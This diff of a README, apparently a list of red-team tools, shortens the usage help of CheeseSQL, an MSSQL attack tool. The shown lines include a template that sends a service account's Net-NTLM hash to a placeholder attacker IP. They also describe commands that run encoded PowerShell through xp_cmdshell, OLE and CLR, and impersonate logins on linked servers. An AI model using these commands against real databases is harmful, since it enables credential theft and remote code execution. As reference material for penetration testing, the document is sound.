@@ -165,55 +165,22 @@ Also, I really recommend to see all the tools from [NetSPI](https://twitter.com/
 - [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL): PowerSHell module for SQL Server discovery, auditing, and exploitation
 
 ```
-Usage:
-[*] findspn
-  Description: Find MSSQL Instances, using Domain SPNs
-  Usage: CheeseSQL findspn /ldapPath:LDAP_PATH /account:FILTER /computer
-[*] gethash
-  Description: Retrieve Net-NTLM Hash for Service Account from a directly accessible DB or Linked SQL Server
-  Usage: CheeseSQL gethash /db:DATABASE /server:SERVER /ip:ATTACKERIP /target:SERVER [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] getlogin
-  Description: Retrieve SQL Logins Available for Impersonation
-  Usage: CheeseSQL getlogin /db:DATABASE /server:SERVER [/impersonate:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] getdbuser
-  Description: Retrieve Information on the SQL Login, Currently Mapped User, and Available User Roles
-  Usage: CheeseSQL getdbuser /db:DATABASE /server:SERVER [/impersonate:USER] [/permissions] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] getlinked
-  Description: Retrieve Linked Servers
-  Usage: CheeseSQL getlinked /db:DATABASE /server:SERVER [/verbose] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] getlinkedlogin
-  Description: Retrieve SQL Logins Available for Impersonation on Linked SQL Servers
-  Usage: CheeseSQL getlinkedlogin /db:DATABASE /server:SERVER /target:TARGET [/impersonate:USER] [/impersonate-linked:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] getlinkeddbuser
-  Description: Retrieve user information on Linked SQL Servers
-  Usage: CheeseSQL getlinkeddbuser /db:DATABASE /server:SERVER /target:TARGET [/permissions] [/impersonate:USER] [/impersonate-linked:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] dbllinkedlogin
-  Description: Get Login Information on Doubly Linked SQL Server
-  Usage: CheeseSQL dbllinkedlogin /db:DATABASE /server:SERVER /intermediate:INTERMEDIATE [/impersonate:USER] [/impersonate-intermediate:USER] [/impersonate-linked:USER] /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] xp
-  Description: Execute Encoded PowerShell Command via 'xp_cmdshell'
-  Usage: CheeseSQL xp /db:DATABASE /server:SERVER /command:COMMAND [/impersonate:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] ole
-  Description: Execute Encoded PowerShell Command via 'sp_OACreate' and 'sp_OAMethod'
-  Usage: CheeseSQL ole /db:DATABASE /server:SERVER /command:COMMAND [/impersonate:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] clr
-  Description: Execute Encoded PowerShell Command via custom CLR assembly
-  Usage: CheeseSQL clr /db:DATABASE /server:SERVER /command:COMMAND /assembly:DLL /class:CLASS /method:METHOD [/compile] [/impersonate:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] rpc
-  Description: Configure Linked SQL Server to Allow RPC connections
-  Usage: CheeseSQL rpc /db:DATABASE /server:SERVER /target:TARGET [/impersonate:(USER|LOGIN):USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] linkedxp
-  Description: Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell'
-  Usage: CheeseSQL linkedxp /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND [/impersonate:USER] [/impersonate-linked:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] linkedquery
-  Description: Execute Encoded PowerShell Command on Linked SQL Server via 'OPENQUERY'
-  Usage: CheeseSQL linkedquery /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND /impersonate:USER /impersonate-linked:USER [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] dbllinkedxp
-  Description: Execute Encoded PowerShell Command on Doubly Linked SQL Server via 'xp_cmdshell'
-  Usage: CheeseSQL dbllinkedxp /db:DATABASE /server:SERVER /intermediate:INTERMEDIATE [/impersonate:USER] [/impersonate-intermediate:USER] [/impersonate-linked:USER] /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-[*] linkedclr
-  Description: Execute Encoded PowerShell Command on Linked SQL Server via custom .NET assemblies
-  Usage: CheeseSQL linkedclr /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND /assembly:DLL /class:CLASS /method:METHOD [/compile] [/impersonate:USER] [/impersonate-linked:USER] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+[*] List of available commands:
+  - findspn             : Find MSSQL Instances, using Domain SPNs
+  - gethash             : Send Service Account Net-NTLM Hash to an Arbitrary IP
+  - getlogin            : Retrieve SQL Logins Available for Impersonation
+  - getdbuser           : Retrieve Information on the SQL Login, Currently Mapped User, and Available User Roles
+  - getlinked           : Retrieve Information about Linked Servers
+  - getserverinfo       : Retrieve current values of 'xp_cmdshell', 'ole automation procedures' and 'clr enabled'
+  - xp                  : Execute Encoded PowerShell Command via 'xp_cmdshell'
+  - ole                 : Execute Encoded PowerShell Command via 'sp_OACreate' and 'sp_OAMethod'
+  - clr                 : Execute Encoded PowerShell Command via custom .NET assemblies
+  - rpc                 : Configure Linked SQL Server to Allow RPC connections
+  - linkedquery         : Execute Encoded PowerShell Command on Linked SQL Server via 'OPENQUERY'
+  - openquery           : Execute an arbitrary query using 'OPENQUERY'
+
+[*] For detailed usage, type:
+  - CheeseSQL <command> /help
 ```
 
 ## Credits
